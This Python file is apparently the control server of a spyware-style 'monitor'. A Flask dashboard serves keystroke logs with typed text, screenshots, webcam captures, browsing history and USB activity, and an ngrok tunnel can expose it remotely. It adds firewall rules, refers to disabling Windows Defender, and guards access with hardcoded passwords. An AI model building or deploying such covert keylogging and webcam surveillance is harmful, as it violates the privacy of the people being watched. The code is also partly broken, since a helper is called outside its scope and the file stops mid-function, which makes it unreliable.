# run_monitor.py
# This file is the main entry point for the monitor.
# It is used to start the monitor and to configure the monitor.
# It is also used to stop the monitor and to clean up the monitor.
# It is also used to restart the monitor and to restart the monitor.
# It is also used to restart the monitor and to restart the monitor.
# MADE BY YESHASWI SINGH
import os
import time
import json
import socket
import threading
import logging
import subprocess
import sys
import signal
import netifaces
import requests
import shutil
import zipfile
import urllib.request
import re
from datetime import datetime, timedelta
from dateutil import parser
import tkinter as tk
from tkinter import ttk, messagebox
from flask import Flask, render_template, jsonify, send_from_directory, request, Response, redirect, url_for, make_response
from functools import wraps
from pyngrok import ngrok, conf
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from collections import defaultdict

# Import monitoring components
from activity_tracker import ActivityTracker
from screenshot_taker import SmartScreenshotTaker
from website_tracker import WebsiteTracker
from internet_monitor import InternetMonitor
from usb_monitor_advanced import USBMonitorAdvanced
from app_usage_tracker import AppUsageTracker
from keystroke_logger_by_app import KeystrokeLoggerByApp
from webcam_capture import WebcamCapture
from live_monitor import LiveMonitor
# from audio_monitor import AudioMonitor
from app_blocker import ApplicationBlocker

# Configure logging
logging.basicConfig(
    level=logging.WARNING,  # Set to WARNING for production
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# Global variables
CONFIG_FILE = 'monitor_config.json'
live_monitor = None
audio_monitor = None
internet_monitor = None
screenshot_taker = None
webcam_capture = None
keystroke_logger = None
usb_monitor = None
app_tracker = None
activity_tracker = None
ngrok_tunnel = None
app_blocker = None

# Monitor states
monitor_states = {
    'screen': True,
    'webcam': True,
    'keystroke': True,
    'usb': True,
    'internet': True,
    'app': True
}

class SetupDialog:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("MANGO TREE Monitor Setup")
        self.root.geometry("500x600")
        self.root.resizable(False, False)
        
        # Set window icon if available
        try:
            if os.path.exists("logo-1-1.webp"):
                icon = tk.PhotoImage(file="logo-1-1.webp")
                self.root.iconphoto(True, icon)
        except:
            pass

        # Create main frame with padding
        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        # Branding
        title_frame = ttk.Frame(main_frame)
        title_frame.grid(row=0, column=0, pady=(0, 20), sticky=tk.W)
        
        title_label = ttk.Label(
            title_frame, 
            text="MANGO TREE TECHNOLOGY",
            font=("Arial", 20, "bold")
        )
        title_label.grid(row=0, column=0, sticky=tk.W)
        
        subtitle_label = ttk.Label(
            title_frame,
            text="Created by Yeshaswi Singh",
            font=("Arial", 12, "italic")
        )
        subtitle_label.grid(row=1, column=0, sticky=tk.W)

        # Separator
        ttk.Separator(main_frame, orient='horizontal').grid(
            row=1, column=0, pady=10, sticky=(tk.W, tk.E)
        )

        # Monitor Name
        ttk.Label(main_frame, text="Monitor Name:", font=("Arial", 10, "bold")).grid(
            row=2, column=0, pady=(10, 5), sticky=tk.W
        )
        self.name_var = tk.StringVar()
        name_entry = ttk.Entry(main_frame, textvariable=self.name_var, width=40)
        name_entry.grid(row=3, column=0, sticky=tk.W)
        name_entry.focus()

        # Port Number
        ttk.Label(main_frame, text="Port Number:", font=("Arial", 10, "bold")).grid(
            row=4, column=0, pady=(20, 5), sticky=tk.W
        )
        self.port_var = tk.StringVar(value="5050")
        port_entry = ttk.Entry(main_frame, textvariable=self.port_var, width=40)
        port_entry.grid(row=5, column=0, sticky=tk.W)

        # Ngrok Token
        ttk.Label(main_frame, text="Ngrok Token (Optional):", font=("Arial", 10, "bold")).grid(
            row=6, column=0, pady=(20, 5), sticky=tk.W
        )
        self.ngrok_var = tk.StringVar()
        ngrok_entry = ttk.Entry(main_frame, textvariable=self.ngrok_var, width=40)
        ngrok_entry.grid(row=7, column=0, sticky=tk.W)
        
        # Ngrok Help Text
        help_text = "Get your token from: https://dashboard.ngrok.com/get-started/your-authtoken"
        ttk.Label(main_frame, text=help_text, font=("Arial", 8), foreground="gray").grid(
            row=8, column=0, pady=(0, 20), sticky=tk.W
        )

        # Separator
        ttk.Separator(main_frame, orient='horizontal').grid(
            row=9, column=0, pady=20, sticky=(tk.W, tk.E)
        )

        # Start Button
        start_button = ttk.Button(
            main_frame, 
            text="Start Monitor",
            command=self.start_monitor,
            style='Accent.TButton'
        )
        start_button.grid(row=10, column=0, pady=(0, 20))

        # Configure style for accent button
        style = ttk.Style()
        style.configure('Accent.TButton', font=('Arial', 12, 'bold'))

        # Center the window
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')

    def validate_inputs(self):
        """Validate user inputs"""
        name = self.name_var.get().strip()
        if not name:
            messagebox.showerror("Error", "Please enter a monitor name")
            return False

        try:
            port = int(self.port_var.get())
            if port < 1024 or port > 65535:
                messagebox.showerror("Error", "Port must be between 1024 and 65535")
                return False
        except ValueError:
            messagebox.showerror("Error", "Port must be a number")
            return False

        return True

    def start_monitor(self):
        """Validate and save configuration"""
        if not self.validate_inputs():
            return

        self.config = {
            'username': self.name_var.get().strip(),
            'port': int(self.port_var.get()),
            'ngrok_token': self.ngrok_var.get().strip() or None
        }
        self.root.quit()

    def show(self):
        """Show the dialog and return configuration"""
        self.config = None
        self.root.mainloop()
        self.root.destroy()
        return self.config

def load_config():
    """Load configuration from file"""
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        return None
    except Exception as e:
        logger.error(f"Error loading config: {str(e)}")
        return None

def save_config(config):
    """Save configuration to file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f)
        return config
    except Exception as e:
        logger.error(f"Error saving config: {str(e)}")
        return None

def get_user_config():
    """Get or create user configuration"""
    try:
        config = load_config()
        if not config:
            # Show setup dialog
            dialog = SetupDialog()
            config = dialog.show()
            if config:
                save_config(config)
            else:
                return None
        return config
    except Exception as e:
        logger.error(f"Error getting user config: {str(e)}")
        return None

def ensure_log_directories():
    """Create necessary log directories"""
    directories = [
        "logs",
        os.path.join("logs", "screenshots"),
        os.path.join("logs", "audio"),
        "WebcamLogs",
        "static",
        os.path.join("static", "screenshots"),
        os.path.join("static", "webcam"),
        "templates"
    ]
    
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)
            logger.info(f"Created directory: {directory}")
    
    # Ensure static directories have proper permissions
    try:
        static_dirs = [
            os.path.join("logs", "screenshots"),
            "WebcamLogs",
            os.path.join("static", "screenshots"),
            os.path.join("static", "webcam")
        ]
        for static_dir in static_dirs:
            if os.path.exists(static_dir):
                # Make sure the directory is readable
                os.chmod(static_dir, 0o755)
    except Exception as e:
        logger.warning(f"Could not set permissions on static directories: {e}")

def test_port_available(port):
    """Test if port is available"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0', port))
        sock.close()
        return True
    except:
        return False

def find_available_port(start_port=5050):
    """Find an available port starting from given port"""
    port = start_port
    while port < 65535:
        if test_port_available(port):
            return port
        port += 1
    return None

def add_firewall_rule(port):
    """Add Windows Firewall rule for the application"""
    if sys.platform == 'win32':
        try:
            # Check if rule already exists
            check_cmd = f'netsh advfirewall firewall show rule name="Monitor Dashboard {port}"'
            try:
                subprocess.check_output(check_cmd, shell=True)
                logger.info("Firewall rule already exists")
                return True
            except:
                pass

            # Add new rule
            cmd = f'netsh advfirewall firewall add rule name="Monitor Dashboard {port}" dir=in action=allow protocol=TCP localport={port}'
            subprocess.check_output(cmd, shell=True)
            logger.info("Added firewall rule successfully")
            return True
        except Exception as e:
            logger.error(f"Failed to add firewall rule: {str(e)}")
            return False
    return True

def cleanup_and_exit():
    """Clean up resources before exiting"""
    try:
        logger.info("Starting cleanup process...")
        
        # Stop all monitors
        if live_monitor:
            live_monitor.stop()
        if audio_monitor:
            audio_monitor.stop()
        if internet_monitor:
            internet_monitor.stop()
        if screenshot_taker:
            screenshot_taker.stop()
        if webcam_capture:
            webcam_capture.stop()
        if keystroke_logger:
            keystroke_logger.stop()
        if usb_monitor:
            usb_monitor.stop()
        if app_tracker:
            app_tracker.stop()
        if activity_tracker:
            activity_tracker.stop()
        if app_blocker:
            app_blocker.stop()
            
        # Clean up ngrok
        if ngrok_tunnel:
            try:
                if hasattr(ngrok_tunnel, 'cleanup'):
                    ngrok_tunnel.cleanup()
                else:
                    # Fallback cleanup for old tunnel objects
                    try:
                        ngrok.disconnect(ngrok_tunnel.public_url)
                        ngrok.kill()
                    except:
                        pass
            except:
                pass
        
        # Re-enable Windows Defender if it was disabled
        try:
            re_enable_defender()
        except:
            pass
                
        logger.info("Cleanup completed")
    except Exception as e:
        logger.error(f"Error during cleanup: {str(e)}")
    sys.exit(0)

def start_flask(host, port):
    """Start Flask server"""
    try:
        app.run(
            host=host,
            port=port,
            debug=False,
            use_reloader=False,
            threaded=True
        )
    except Exception as e:
        logger.error(f"Failed to start server: {str(e)}")

# Initialize Flask app
app = Flask(__name__)
app.config['SERVER_NAME'] = None
app.secret_key = os.urandom(24)

# Add session secret key for security
app.secret_key = os.urandom(24)

# Global authentication check
@app.before_request
def check_auth():
    """Check authentication for all routes except login and static files"""
    # List of routes that don't require authentication
    public_paths = ['/login', '/auth', '/static', '/logout']
    
    # Allow public routes
    if any(request.path.startswith(path) for path in public_paths):
        return None
        
    # Check authentication for all other routes
    auth_cookie = request.cookies.get('auth')
    if not auth_cookie or auth_cookie != 'happykutta':
        # If it's an API route, return JSON response
        if request.path.startswith('/api/'):
            return jsonify({
                'success': False,
                'error': 'Authentication required',
                'message': 'Please log in to access this resource'
            }), 401
        # For other routes, redirect to login
        return redirect(url_for('login'))

def login_required(f):
    """Decorator for routes that require login"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_cookie = request.cookies.get('auth')
        if not auth_cookie or auth_cookie != 'happykutta':
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def password_required(f):
    """Decorator for system control routes that require password"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        data = request.get_json() if request.is_json else request.form
        password = data.get('password')
        
        if not password or password != 'mangotree':
            return jsonify({'success': False, 'error': 'Invalid password'}), 401
        
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    """Root route - always show login first"""
    return redirect(url_for('login'))

@app.route('/login')
def login():
    """Login page route"""
    # Clear any existing auth cookie
    response = make_response(render_template('login.html'))
    response.delete_cookie('auth')
    return response

@app.route('/auth', methods=['POST'])
def auth():
    """Authentication endpoint"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({
                'success': False,
                'error': 'No data provided'
            }), 400

        password = data.get('password')
        if not password:
            return jsonify({
                'success': False,
                'error': 'Password is required'
            }), 400

        if password == 'happykutta':
            response = jsonify({
                'success': True,
                'message': 'Login successful',
                'redirect': '/dashboard'
            })
            response.set_cookie('auth', 'happykutta', httponly=True)
            return response

        return jsonify({
            'success': False,
            'error': 'Invalid password'
        }), 401

    except Exception as e:
        print(f"Login error: {str(e)}")
        return jsonify({
            'success': False,
            'error': 'Server error'
        }), 500

@app.route('/dashboard')
@login_required
def dashboard():
    """Dashboard route - protected by login"""
    try:
        config = load_config()
        if not config:
            return redirect(url_for('login'))
        return render_template('index.html', username=config['username'])
    except Exception as e:
        return redirect(url_for('login'))

@app.route('/logout')
def logout():
    """Logout route - clear auth and redirect to login"""
    response = redirect(url_for('login'))
    response.delete_cookie('auth')
    return response

def get_datetime_filters():
    """Get datetime filter parameters from request"""
    try:
        from_date = request.args.get('fromDate', datetime.now().strftime("%Y-%m-%d"))
        from_time = request.args.get('fromTime', "00:00")
        to_date = request.args.get('toDate', datetime.now().strftime("%Y-%m-%d"))
        to_time = request.args.get('toTime', "23:59")
        
        from_datetime = datetime.strptime(f"{from_date} {from_time}", "%Y-%m-%d %H:%M")
        to_datetime = datetime.strptime(f"{to_date} {to_time}", "%Y-%m-%d %H:%M")
        
        return from_datetime, to_datetime
    except:
        # Default to today
        today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        return today, today.replace(hour=23, minute=59, second=59)

def is_within_timerange(timestamp_str, from_datetime, to_datetime):
    """Check if timestamp is within the specified range"""
    try:
        timestamp = datetime.strptime(timestamp_str, '%Y-%m-%d %H:%M:%S')
        return from_datetime <= timestamp <= to_datetime
    except:
        return False

@app.route('/api/activity')
@login_required
def api_activity():
    """Get activity data"""
    try:
        from_datetime, to_datetime = get_datetime_filters()
        data = []
        
        # Ensure logs directory exists
        if not os.path.exists('logs'):
            os.makedirs('logs')
            
        # Create window log file if it doesn't exist
        log_file = os.path.join('logs', 'window_log.txt')
        if not os.path.exists(log_file):
            open(log_file, 'a').close()
            
        with open(log_file, 'r', encoding='utf-8') as f:
            for line in f:
                if '[' in line and ']' in line:
                    try:
                        timestamp = line[line.find('[')+1:line.find(']')]
                        dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                        if from_datetime <= dt <= to_datetime:
                            activity = line[line.find(']')+1:].strip()
                            data.append([
                                timestamp,
                                'Window Activity',
                                activity
                            ])
                    except:
                        continue
        
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': len(data),
            'recordsFiltered': len(data),
            'data': data
        })
    except Exception as e:
        print(f"Error in api_activity: {str(e)}")
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': 0,
            'recordsFiltered': 0,
            'data': []
        })

@app.route('/api/website')
@login_required
def api_website():
    """Get website history data"""
    try:
        from_datetime, to_datetime = get_datetime_filters()
        data = []
        
        # Ensure logs directory exists
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        # Create website log file if it doesn't exist
        log_file = os.path.join('logs', 'website_log.txt')
        if not os.path.exists(log_file):
            open(log_file, 'a').close()
        
        with open(log_file, 'r', encoding='utf-8') as f:
            for line in f:
                if '[' in line and ']' in line:
                    try:
                        timestamp = line[line.find('[')+1:line.find(']')]
                        dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                        if from_datetime <= dt <= to_datetime:
                            website_info = line[line.find(']')+1:].strip()
                            if ' - ' in website_info:
                                parts = website_info.split(' - ')
                                data.append([
                                    timestamp,
                                    parts[0].strip(),  # Browser
                                    parts[1].strip(),  # URL
                                    parts[2].strip() if len(parts) > 2 else 'Unknown'  # Title
                                ])
                    except:
                        continue
        
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': len(data),
            'recordsFiltered': len(data),
            'data': data
        })
    except Exception as e:
        print(f"Error in api_website: {str(e)}")
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': 0,
            'recordsFiltered': 0,
            'data': []
        })

def format_size(bytes_size):
    """Format bytes into human readable size"""
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_size < 1024.0:
            return f"{bytes_size:.2f} {unit}"
        bytes_size /= 1024.0
    return f"{bytes_size:.2f} PB"

def convert_to_bytes(size_str):
    """Convert a human readable size to bytes"""
    units = {'B': 1, 'KB': 1024, 'MB': 1024**2, 'GB': 1024**3, 'TB': 1024**4, 'PB': 1024**5}
    number = float(size_str.split()[0])
    unit = size_str.split()[1]
    return int(number * units[unit])

@app.route('/api/internet')
@login_required
def api_internet():
    """Get internet usage data"""
    try:
        from_datetime, to_datetime = get_datetime_filters()
        
        # Ensure logs directory exists
        if not os.path.exists('logs'):
            os.makedirs('logs')
            
        # Create internet log file if it doesn't exist
        log_file = os.path.join('logs', 'internet_log.txt')
        if not os.path.exists(log_file):
            open(log_file, 'a').close()
        
        # Get data for the requested date range
        data = defaultdict(lambda: {'sent': 0, 'recv': 0})
        
        try:
            with open(log_file, 'r') as f:
                for line in f:
                    if line.strip():
                        try:
                            # Parse CSV format: timestamp,app_name,sent_bytes,received_bytes
                            timestamp, app_name, sent, recv = line.strip().split(',')
                            dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                            
                            if from_datetime <= dt <= to_datetime:
                                data[app_name]['sent'] += int(sent)
                                data[app_name]['recv'] += int(recv)
                        except Exception as e:
                            print(f"Error parsing line: {line.strip()} - {str(e)}")
                            continue
        except Exception as e:
            print(f"Error reading internet log: {str(e)}")
        
        # Convert data to table format
        table_data = []
        for app_name, usage in data.items():
            sent_bytes = usage['sent']
            recv_bytes = usage['recv']
            total_bytes = sent_bytes + recv_bytes
            
            if total_bytes > 0:  # Only include apps with actual usage
                table_data.append([
                    app_name,
                    format_size(sent_bytes),
                    format_size(recv_bytes),
                    format_size(total_bytes)
                ])
        
        # Sort by total usage (descending)
        table_data.sort(key=lambda x: convert_to_bytes(x[3]), reverse=True)
        
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': len(table_data),
            'recordsFiltered': len(table_data),
            'data': table_data
        })
        
    except Exception as e:
        print(f"Error in api_internet: {str(e)}")
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': 0,
            'recordsFiltered': 0,
            'data': []
        })

@app.route('/api/usb')
@login_required
def api_usb():
    try:
        data = []
        with open('logs/usb_activity_log.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if '[' in line and ']' in line:
                    timestamp = line[line.find('[')+1:line.find(']')]
                    event_info = line[line.find(']')+1:].strip()
                    if ' - ' in event_info:
                        event, device = event_info.split(' - ', 1)
                        data.append([
                            timestamp,
                            event,
                            device,
                            'Connected' if 'Connected' in event else 'Disconnected'
                        ])
        return jsonify({
            'draw': 1,
            'recordsTotal': len(data),
            'recordsFiltered': len(data),
            'data': data
        })
    except Exception as e:
        return jsonify({
            'draw': 1,
            'recordsTotal': 0,
            'recordsFiltered': 0,
            'data': []
        })

@app.route('/api/apps')
@login_required
def api_apps():
    """Get application usage data"""
    try:
        # Ensure logs directory exists
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        # Create app usage log file if it doesn't exist
        log_file = os.path.join('logs', 'app_usage_log.txt')
        if not os.path.exists(log_file):
            open(log_file, 'a').close()
        
        data = []
        
        try:
            with open(log_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:  # Only process non-empty lines with a colon
                        try:
                            app_name, duration = line.split(':', 1)
                            app_name = app_name.strip()
                            duration = duration.strip()
                            
                            # Use current time as last_used
                            last_used = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            
                            # Only add if we have both app name and duration
                            if app_name and duration:
                                data.append([
                                    app_name,
                                    duration,
                                    last_used
                                ])
                        except Exception as e:
                            print(f"Error parsing app usage line: {line} - {str(e)}")
                            continue
        except Exception as e:
            print(f"Error reading app usage log: {str(e)}")
        
        # Sort by duration (assuming format like "X hours Y minutes" or "X minutes")
        def parse_duration(duration_str):
            try:
                total_minutes = 0
                if 'hours' in duration_str:
                    hours = int(duration_str.split('hours')[0].strip())
                    total_minutes += hours * 60
                    # Check for additional minutes after hours
                    if 'minutes' in duration_str:
                        minutes = int(duration_str.split('minutes')[0].split()[-1].strip())
                        total_minutes += minutes
                elif 'hour' in duration_str and 'hours' not in duration_str:
                    hours = int(duration_str.split('hour')[0].strip())
                    total_minutes += hours * 60
                    # Check for additional minutes after hour
                    if 'minutes' in duration_str:
                        minutes = int(duration_str.split('minutes')[0].split()[-1].strip())
                        total_minutes += minutes
                elif 'minutes' in duration_str:
                    minutes = int(duration_str.split('minutes')[0].strip())
                    total_minutes += minutes
                elif 'minute' in duration_str and 'minutes' not in duration_str:
                    minutes = int(duration_str.split('minute')[0].strip())
                    total_minutes += minutes
                return total_minutes
            except:
                return 0  # Return 0 for "Less than a minute" or invalid formats
        
        # Sort by duration in descending order
        data.sort(key=lambda x: parse_duration(x[1]), reverse=True)
        
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': len(data),
            'recordsFiltered': len(data),
            'data': data
        })
        
    except Exception as e:
        print(f"Error in api_apps: {str(e)}")
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': 0,
            'recordsFiltered': 0,
            'data': []
        })

@app.route('/api/keystroke_content')
@login_required
def api_keystroke_content():
    try:
        from_datetime, to_datetime = get_datetime_filters()
        application = request.args.get('application', '')
        
        if not application:
            return jsonify({'content': []})
            
        content = []
        
        # Get all keystroke log files in the logs directory
        log_files = [f for f in os.listdir('logs') if f.startswith('keystrokes_') and f.endswith('.txt')]
        
        for log_file in log_files:
            file_path = os.path.join('logs', log_file)
            
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    current_timestamp = None
                    current_app = None
                    current_text = None
                    
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                            
                        if line.startswith('['):
                            # If we have accumulated text, save it
                            if current_text and current_app == application:
                                content.append({
                                    'timestamp': current_timestamp,
                                    'content': current_text.strip()
                                })
                            current_text = None
                            
                            # Parse timestamp and app info
                            timestamp = line[line.find('[')+1:line.find(']')]
                            if not is_within_timerange(timestamp, from_datetime, to_datetime):
                                current_app = None
                                continue
                                
                            app_info = line[line.find(']')+1:].strip()
                            if ' - ' in app_info:
                                current_app = app_info.split(' - ')[0].strip()
                                current_timestamp = timestamp
                                
                        elif line.startswith('Text:') and current_app == application:
                            # Get the actual text content
                            current_text = line.replace('Text:', '').strip()
                    
                    # Save any remaining text
                    if current_text and current_app == application:
                        content.append({
                            'timestamp': current_timestamp,
                            'content': current_text.strip()
                        })
                        
            except Exception as e:
                print(f"Error reading keystroke file {log_file}: {str(e)}")
                continue
        
        # Sort by timestamp in descending order
        content.sort(key=lambda x: x['timestamp'], reverse=True)
        
        return jsonify({'content': content})
        
    except Exception as e:
        print(f"Error in api_keystroke_content: {str(e)}")
        return jsonify({'content': []})

@app.route('/api/keystrokes')
@login_required
def api_keystrokes():
    """Get keystroke statistics"""
    try:
        from_datetime, to_datetime = get_datetime_filters()
        
        # Ensure logs directory exists
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        # Initialize counts dictionary
        app_counts = defaultdict(int)
        app_last_date = {}
        
        # Get all keystroke log files
        log_files = [f for f in os.listdir('logs') if f.startswith('keystrokes_') and f.endswith('.txt')]
        
        # Process each log file
        for log_file in log_files:
            file_path = os.path.join('logs', log_file)
            
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    current_app = None
                    current_timestamp = None
                    
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        
                        if line.startswith('['):
                            # Parse timestamp and app info
                            timestamp = line[line.find('[')+1:line.find(']')]
                            try:
                                dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                                if from_datetime <= dt <= to_datetime:
                                    app_info = line[line.find(']')+1:].strip()
                                    if ' - ' in app_info:
                                        current_app = app_info.split(' - ')[0].strip()
                                        current_timestamp = timestamp
                                        app_last_date[current_app] = dt.strftime("%Y-%m-%d")
                            except:
                                current_app = None
                                continue
                        elif line.startswith('Text:') and current_app:
                            # Count characters in the text
                            text = line.replace('Text:', '').strip()
                            app_counts[current_app] += len(text)
            except:
                continue
        
        # Convert to DataTables format
        data = [
            [
                app_last_date.get(app, datetime.now().strftime("%Y-%m-%d")),
                app,
                count
            ]
            for app, count in app_counts.items()
            if count > 0  # Only include apps with keystrokes
        ]
        
        # Sort by keystroke count in descending order
        data.sort(key=lambda x: x[2], reverse=True)
        
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': len(data),
            'recordsFiltered': len(data),
            'data': data
        })
    except Exception as e:
        print(f"Error in api_keystrokes: {str(e)}")
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': 0,
            'recordsFiltered': 0,
            'data': []
        })

@app.route('/api/screenshots')
@login_required
def api_screenshots():
    try:
        from_datetime, to_datetime = get_datetime_filters()
        screenshots_dir = os.path.join('logs', 'screenshots')
        screenshots = []
        
        for filename in os.listdir(screenshots_dir):
            if filename.endswith(('.png', '.jpg')):
                timestamp = filename.replace('screenshot_', '').replace('.png', '').replace('.jpg', '')
                try:
                    dt = datetime.strptime(timestamp, '%Y%m%d_%H%M%S')
                    if from_datetime <= dt <= to_datetime:
                        formatted_time = dt.strftime('%Y-%m-%d %H:%M:%S')
                        screenshots.append({
                            'url': f'/static/screenshots/{filename}',  # Updated path
                            'timestamp': formatted_time
                        })
                except:
                    continue
        
        return jsonify({'screenshots': sorted(screenshots, key=lambda x: x['timestamp'], reverse=True)})
    except Exception as e:
        print(f"Error in api_screenshots: {str(e)}")
        return jsonify({'screenshots': []})

@app.route('/api/webcam')
@login_required
def api_webcam():
    try:
        from_datetime, to_datetime = get_datetime_filters()
        webcam_dir = 'WebcamLogs'
        captures = []
        
        for filename in os.listdir(webcam_dir):
            if filename.endswith(('.jpg', '.png')):
                timestamp = filename.replace('capture_', '').replace('.jpg', '').replace('.png', '')
                try:
                    dt = datetime.strptime(timestamp, '%Y-%m-%d_%H-%M-%S')
                    if from_datetime <= dt <= to_datetime:
                        formatted_time = dt.strftime('%Y-%m-%d %H:%M:%S')
                        captures.append({
                            'url': f'/static/webcam/{filename}',  # Updated path
                            'timestamp': formatted_time
                        })
                except:
                    continue
        
        return jsonify({'captures': sorted(captures, key=lambda x: x['timestamp'], reverse=True)})
    except Exception as e:
        print(f"Error in api_webcam: {str(e)}")
        return jsonify({'captures': []})

@app.route('/api/monitor/toggle', methods=['POST'])
@login_required
def toggle_monitor():
    """Toggle monitor status"""
    try:
        data = request.get_json()
        monitor = data.get('monitor')
        enabled = data.get('enabled')
        
        if monitor not in monitor_states:
            return jsonify({'error': 'Invalid monitor type'}), 400
            
        monitor_states[monitor] = enabled
        
        # Update the corresponding monitor
        if monitor == 'screen' and screenshot_taker:
            if enabled:
                screenshot_taker.start()
            else:
                screenshot_taker.stop()
        elif monitor == 'webcam' and webcam_capture:
            if enabled:
                webcam_capture.start()
            else:
                webcam_capture.stop()
        elif monitor == 'keystroke' and keystroke_logger:
            if enabled:
                keystroke_logger.start()
            else:
                keystroke_logger.stop()
        elif monitor == 'usb' and usb_monitor:
            if enabled:
                usb_monitor.start()
            else:
                usb_monitor.stop()
        elif monitor == 'internet' and internet_monitor:
            if enabled:
                internet_monitor.start()
            else:
                internet_monitor.stop()
        elif monitor == 'app' and app_tracker:
            if enabled:
                app_tracker.start()
            else:
                app_tracker.stop()
            
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"Error toggling monitor: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/monitor/status')
@login_required
def get_monitor_status():
    """Get status of all monitors"""
    try:
        return jsonify({
            'screen': monitor_states['screen'],
            'webcam': monitor_states['webcam'],
            'keystroke': monitor_states['keystroke'],
            'usb': monitor_states['usb'],
            'internet': monitor_states['internet'],
            'app': monitor_states['app']
        })
    except Exception as e:
        logger.error(f"Error getting monitor status: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/dashboard/stats')
@login_required
def api_dashboard_stats():
    """Get quick stats for the dashboard"""
    try:
        # Get unique website count
        unique_domains = set()
        try:
            with open('logs/website_log.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    if '] Chrome - ' in line or '] Edge - ' in line or '] Firefox - ' in line:
                        # Extract website URL
                        parts = line.split(' - ')
                        if len(parts) > 1:
                            url = parts[1].strip()
                            # Clean and normalize the URL
                            try:
                                from urllib.parse import urlparse
                                parsed = urlparse(url)
                                # Get domain without www.
                                domain = parsed.netloc
                                if domain.startswith('www.'):
                                    domain = domain[4:]
                                # Handle cases where parsing fails
                                if not domain and '/' in url:
                                    domain = url.split('/')[0]
                                if not domain:
                                    domain = url
                                # Add to unique domains set
                                if domain:
                                    unique_domains.add(domain.lower())
                            except:
                                # If URL parsing fails, use the original URL
                                if url:
                                    unique_domains.add(url.lower())
        except Exception as e:
            logger.error(f"Error reading website log: {str(e)}")

        website_count = len(unique_domains)
        
        # Get app count
        app_count = 0
        unique_apps = set()
        with open('logs/app_usage_log.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if ':' in line:
                    app = line.split(':')[0].strip()
                    unique_apps.add(app)
            app_count = len(unique_apps)
        
        # Calculate active time today
        active_time = 0
        today = datetime.now().strftime("%Y-%m-%d")
        with open('logs/app_usage_log.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if ':' in line:
                    duration = line.split(':')[1].strip()
                    active_time += parse_duration(duration)
        
        hours = active_time // 3600
        minutes = (active_time % 3600) // 60
        active_time_formatted = f"{hours}h {minutes}m"
        
        return jsonify({
            'website_count': website_count,
            'app_count': app_count,
            'active_time': active_time_formatted
        })
    except Exception as e:
        logger.error(f"Error getting dashboard stats: {str(e)}")
        return jsonify({
            'website_count': 0,
            'app_count': 0,
            'active_time': '0h 0m'
        })

@app.route('/api/dashboard/app_usage')
@login_required
def api_dashboard_app_usage():
    """Get app usage data for pie chart"""
    try:
        app_usage = {}
        
        # Read the app usage data from JSON file
        data_file = os.path.join('logs', 'app_usage_data.json')
        if os.path.exists(data_file):
            with open(data_file, 'r') as f:
                data = json.load(f)
                if data['date'] == datetime.now().strftime("%Y-%m-%d"):
                    app_usage = data['usage']
        
        if not app_usage:
            # Fallback to log file if JSON doesn't exist
            with open('logs/app_usage_log.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    if ':' in line and '=' not in line:  # Skip header lines
                        app, duration = line.strip().split(':', 1)
                        app = app.strip()
                        seconds = parse_duration(duration.strip())
                        app_usage[app] = seconds
        
        # Sort by usage and get top 5
        sorted_apps = sorted(app_usage.items(), key=lambda x: x[1], reverse=True)[:5]
        
        # Add "Others" category
        others = sum(app_usage[app] for app in app_usage if app not in dict(sorted_apps))
        if others > 0:
            sorted_apps.append(('Others', others))
        
        # Convert seconds to minutes for better readability
